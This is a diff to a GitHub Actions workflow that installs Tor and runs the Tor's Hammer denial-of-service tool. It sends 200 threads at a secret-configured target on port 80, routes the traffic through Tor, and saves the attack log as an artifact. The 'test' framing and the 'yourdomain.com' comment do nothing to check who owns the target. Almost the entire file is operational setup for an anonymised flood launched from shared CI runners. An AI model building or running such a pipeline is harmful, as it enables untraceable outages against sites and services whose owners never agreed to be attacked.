@@ -1,16 +1,17 @@
 name: Tor's Hammer DoS Test
 
 on:
-  push:
-    branches: [ main ]
-  pull_request:
-    branches: [ main ]
-  workflow_dispatch:  # Manual run button
+  workflow_dispatch:  # Manual trigger only (safer)
+
+environment:
+  name: dos-test
+  url: https://github.com
 
 jobs:
   test:
     runs-on: ubuntu-latest
-    timeout-minutes: 10  # Prevent hanging
+    timeout-minutes: 15
+    environment: dos-test  # Links to environment + secrets
 
     steps:
     - name: Checkout code
@@ -27,33 +28,33 @@ jobs:
         sudo apt-get update -qq
         sudo apt-get install -y tor
 
-    - name: Start Tor service
+    - name: Start Tor
       run: |
         sudo service tor start
-        echo "Waiting for Tor to start..."
+        echo "Waiting 10s for Tor to connect..."
         sleep 10
-        # Verify Tor is running
-        curl --socks5-hostname 127.0.0.1:9050 -s https://check.torproject.org/api/ip | grep -q '"IsTor":true' && echo "Tor is working!" || echo "Tor failed!"
+        curl --socks5-hostname 127.0.0.1:9050 -s https://check.torproject.org/api/ip | grep -q '"IsTor":true' && echo "Tor is ACTIVE!" || echo "Tor failed to connect."
 
     - name: Run Tor's Hammer
+      env:
+        TARGET: ${{ secrets.TEST_TARGET }}  # Correct way to read environment secret
       run: |
-        # Fail fast if no target
-        if [ -z "${{ secrets.TEST_TARGET }}" ]; then
-          echo "ERROR: TEST_TARGET secret not set!"
-          echo "Go to Settings > Secrets > Actions and add TEST_TARGET with your domain/IP"
+        if [ -z "$TARGET" ]; then
+          echo "ERROR: TEST_TARGET not set in 'dos-test' environment!"
+          echo "Go to: Settings > Environments > dos-test > Add secret: TEST_TARGET = yourdomain.com"
           exit 1
         fi
 
-        echo "Starting attack on ${{ secrets.TEST_TARGET }}:80 with 200 threads via Tor..."
-        python3 torshammer.py -s ${{ secrets.TEST_TARGET }} -p 80 -r 200 -T > hammer-attack.log 2>&1 || true
+        echo "Starting attack on $TARGET:80 with 200 threads via Tor..."
+        python3 torshammer.py -s "$TARGET" -p 80 -r 200 -T > hammer-attack.log 2>&1 || true
 
-        echo "Attack completed. Log saved."
-        cat hammer-attack.log
+        echo "Attack finished. Full log:"
+        cat hammer-attack.log || echo "No log output."
 
     - name: Upload Attack Log
       if: always()
       uses: actions/upload-artifact@v4
       with:
-        name: torshammer-attack-log
+        name: torshammer-attack-log-${{ github.run_number }}
         path: hammer-attack.log
         retention-days: 7
